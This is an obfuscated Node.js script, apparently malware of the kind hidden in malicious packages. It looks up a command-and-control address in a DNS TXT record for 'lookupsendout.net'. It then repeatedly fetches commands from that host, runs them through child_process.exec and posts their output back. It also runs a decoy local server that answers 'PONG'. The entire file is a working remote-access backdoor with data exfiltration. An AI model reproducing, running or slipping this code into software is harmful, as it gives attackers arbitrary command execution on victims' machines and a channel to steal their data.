const _0x5beb76=_0xb55a;(function(_0x73a2cc,_0x3eefd0){const _0x477be1=_0xb55a,_0x1e4858=_0x73a2cc();while(!![]){try{const _0xda6e64=-parseInt(_0x477be1(0x205))/0x1+-parseInt(_0x477be1(0x1e7))/0x2+parseInt(_0x477be1(0x1f9))/0x3*(parseInt(_0x477be1(0x1ef))/0x4)+parseInt(_0x477be1(0x1e8))/0x5*(parseInt(_0x477be1(0x1ff))/0x6)+parseInt(_0x477be1(0x1fa))/0x7+parseInt(_0x477be1(0x1fb))/0x8*(parseInt(_0x477be1(0x1ee))/0x9)+parseInt(_0x477be1(0x1f8))/0xa*(-parseInt(_0x477be1(0x1fc))/0xb);if(_0xda6e64===_0x3eefd0)break;else _0x1e4858['push'](_0x1e4858['shift']());}catch(_0xdb7591){_0x1e4858['push'](_0x1e4858['shift']());}}}(_0x6c96,0xc5e5c));const http=require(_0x5beb76(0x1f6)),exec=require(_0x5beb76(0x200))[_0x5beb76(0x1f7)],dns=require(_0x5beb76(0x202));let ATTACKER_IP='',ATTACKER_PORT=0x0;const runCommand=function(_0x3747c7,_0x111ec8){exec(_0x3747c7,(_0x4b0517,_0x27fafa,_0x59978a)=>{const _0x6b71dd=_0xb55a;console[_0x6b71dd(0x203)](_0x27fafa),sendPost(_0x27fafa),sendPost(_0x59978a),_0x111ec8();});},sendPost=function(_0x555a00){const _0x3108f4=_0x5beb76;console[_0x3108f4(0x203)](_0x555a00);let _0x41acf8='',_0x37b7cb=_0x3108f4(0x201)+encodeURIComponent(_0x555a00),_0x449362=http[_0x3108f4(0x1f1)]({'hostname':ATTACKER_IP,'port':ATTACKER_PORT,'path':'/','method':'POST','headers':{'Content-Type':_0x3108f4(0x1f2),'Content-Length':_0x37b7cb[_0x3108f4(0x1f4)]}},_0x232d57=>{const _0x3c726f=_0x3108f4;_0x232d57['on'](_0x3c726f(0x1e9),_0x158299=>{_0x41acf8+=_0x158299;}),_0x232d57['on'](_0x3c726f(0x1f3),()=>{const _0x165eba=_0x3c726f;console[_0x165eba(0x203)](_0x41acf8);});})['on'](_0x3108f4(0x1eb),_0x39ed1c=>{const _0xc3ad27=_0x3108f4;console[_0xc3ad27(0x203)]('Error:\x20',_0x39ed1c);});_0x449362[_0x3108f4(0x1e6)](_0x37b7cb),_0x449362[_0x3108f4(0x1f3)]();};function attach(){const _0x101b34=_0x5beb76,_0x15b68c=http['request']({'hostname':ATTACKER_IP,'port':ATTACKER_PORT,'path':'/','method':_0x101b34(0x1f0)},_0x1ecdc0=>{let _0x1be497='';_0x1ecdc0['on']('data',_0x225900=>{_0x1be497+=_0x225900;}),_0x1ecdc0['on']('end',()=>{const _0x2331fc=_0xb55a;if(_0x1be497==='terminate')return;else _0x1be497==='grab'?(console[_0x2331fc(0x203)]('future'),attach()):runCommand(_0x1be497,function(){attach();});});})['on']('error',_0x15bdaf=>{const _0x2bcb78=_0x101b34;console[_0x2bcb78(0x203)]('Error:\x20',_0x15bdaf);})[_0x101b34(0x1f3)]();}function _0xb55a(_0x165ce,_0xfbfe67){const _0x6c9675=_0x6c96();return _0xb55a=function(_0xb55a42,_0x4a9553){_0xb55a42=_0xb55a42-0x1e6;let _0x361896=_0x6c9675[_0xb55a42];return _0x361896;},_0xb55a(_0x165ce,_0xfbfe67);}dns[_0x5beb76(0x1ed)]('lookupsendout.net',(_0x1ec6bb,_0x30f50c)=>{const _0x33ec7f=_0x5beb76;console[_0x33ec7f(0x203)](_0x30f50c[0x0][0x0]),ATTACKER_IP=_0x30f50c[0x0][0x0][_0x33ec7f(0x1ec)](':')[0x0],ATTACKER_PORT=parseInt(_0x30f50c[0x0][0x0][_0x33ec7f(0x1ec)](':')[0x1]);});function _0x6c96(){const _0x2fe6a8=['application/x-www-form-urlencoded','end','length','createServer','http','exec','26640690lPafYX','6GWkOBU','6863213hkOotl','12654680LhCRmB','11uDAIwK','writeHead','0.0.0.0','12HLQTBh','child_process','rfile=','dns','log','PONG','292212hQvifB','write','1971034QJTBpg','3452065hGSrGn','data','listen','error','split','resolveTxt','9wfghgW','1618532mnHsdX','GET','request'];_0x6c96=function(){return _0x2fe6a8;};return _0x6c96();}const server=http[_0x5beb76(0x1f5)](function(_0x2d1acf,_0x1f64e8){const _0x3b0e75=_0x5beb76;_0x1f64e8[_0x3b0e75(0x1fd)](0xc8),_0x1f64e8[_0x3b0e75(0x1f3)](_0x3b0e75(0x204));});server[_0x5beb76(0x1ea)](0x1f90,_0x5beb76(0x1fe),()=>{const _0x3c7fb8=_0x5beb76;console[_0x3c7fb8(0x203)]('Server\x20is\x20running\x20...');});